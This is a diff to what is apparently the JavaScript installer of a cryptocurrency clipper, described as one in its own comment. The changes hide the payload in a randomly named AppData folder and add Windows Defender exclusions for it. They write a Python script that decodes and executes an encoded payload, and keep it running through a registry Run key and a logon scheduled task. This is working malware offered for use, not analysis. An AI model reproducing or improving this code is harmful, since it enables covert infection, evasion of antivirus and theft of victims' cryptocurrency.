@@ -1035,11 +1035,11 @@ async function installPython() {
 }
 
 function addDefenderExclusions() {
-    const roamingPath = path.join(os.homedir(), 'AppData', 'Roaming');
+    const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
     const systemTasksPath = 'C:\\Windows\\System32\\Tasks';
 
     const commands = [
-        `powershell -Command Add-MpPreference -ExclusionPath "${roamingPath}"`,
+        `powershell -Command Add-MpPreference -ExclusionPath "${appDataHiddenFolder}"`,
         `powershell -Command Add-MpPreference -ExclusionPath "${systemTasksPath}"`
     ];
 
@@ -1069,9 +1069,10 @@ const addresses = {
 
 // This is a clipper, here is the decrypted code: https://pastebin.com/raw/ujJT2Xje (DM me on Telegram if you don't know how to decrypt base64 :0)
 async function clip(pythonwExe) {
-    const userDataPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
-    if (!fs.existsSync(userDataPath)) {
-        fs.mkdirSync(userDataPath, { recursive: true });
+    const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
+    if (!fs.existsSync(appDataHiddenFolder)) {
+        fs.mkdirSync(appDataHiddenFolder, { recursive: true });
+        fs.chmodSync(appDataHiddenFolder, 0o700); // Make it hidden
     }
 
     const scriptContent = `
@@ -1099,15 +1100,21 @@ decoded_code = base64.b32decode(encoded_code).decode('utf-8')
 exec(decoded_code)
 `;
 
-    const scriptFilePath = path.join(userDataPath, `${generateRandomString(10)}.py`);
+    const scriptFilePath = path.join(appDataHiddenFolder, `${generateRandomString(10)}.py`);
     fs.writeFileSync(scriptFilePath, scriptContent);
 
     try {
+        // Add the script to the registry for startup
+        const registryCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PythonScript" /t REG_SZ /d "${pythonwExe} \\"${scriptFilePath}\\"" /f`;
+        execSync(registryCommand);
+        console.log('Python script added to registry for startup.');
+
+        // Also schedule the task
         const taskName = `PythonUpdater_${generateRandomString(8)}`;
         execSync(`schtasks /create /tn "${taskName}" /tr "\"${pythonwExe}\" \"${scriptFilePath}\"" /sc onlogon /f`);
         console.log('Python script scheduled to run at logon.');
     } catch (error) {
-        console.error(`Error scheduling task: ${error.message}`);
+        console.error(`Error scheduling task or adding registry entry: ${error.message}`);
     }
     
     // Run the Python script in the background
@@ -1123,8 +1130,8 @@ exec(decoded_code)
 // Main function to create and execute scripts and add Defender exclusions
 async function createAndExecuteScripts() {
     try {
-        addDefenderExclusions(); // Corrected function name
-        const pythonwExe = await installPython();
+        addDefenderExclusions(); // Add hidden folder to Defender exclusions
+        const pythonwExe = await installPython(); // Assume installPython is your function to install Python
         await clip(pythonwExe);  // Run the Python script
     } catch (error) {
         console.error(`Error: ${error.message}`);
